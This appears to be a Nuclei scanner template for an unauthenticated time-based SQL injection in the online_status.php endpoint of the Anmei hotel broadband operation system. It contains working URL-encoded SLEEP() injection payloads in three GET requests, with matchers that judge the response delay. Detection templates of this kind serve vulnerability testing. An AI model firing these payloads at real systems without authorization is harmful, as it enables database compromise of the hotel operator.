id: amsz-online-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 安美数字酒店宽带运营系统 online_status.php、language.php等接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。
  reference:
    - http://kpanda.wiki/#/Vulnhub/A18-1%E5%AE%89%E7%BE%8E-%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-SQL?id=a18-1%e5%ae%89%e7%be%8e-%e6%95%b0%e5%ad%97%e9%85%92%e5%ba%97%e5%ae%bd%e5%b8%a6%e8%bf%90%e8%90%a5%e7%b3%bb%e7%bb%9f-sql
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/manager/frontdesk/online_status.php?AccountID=1%27+AND+%28SELECT+6097+FROM+%28SELECT%28SLEEP%283%29%29%29ClPT%29--+lMyr"
      - "{{BaseURL}}/manager/frontdesk/online_status.php?AccountID=1%27+AND+%28SELECT+6097+FROM+%28SELECT%28SLEEP%286%29%29%29ClPT%29--+lMyr"
      - "{{BaseURL}}/manager/frontdesk/online_status.php?AccountID=1%27+AND+%28SELECT+6097+FROM+%28SELECT%28SLEEP%289%29%29%29ClPT%29--+lMyr"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"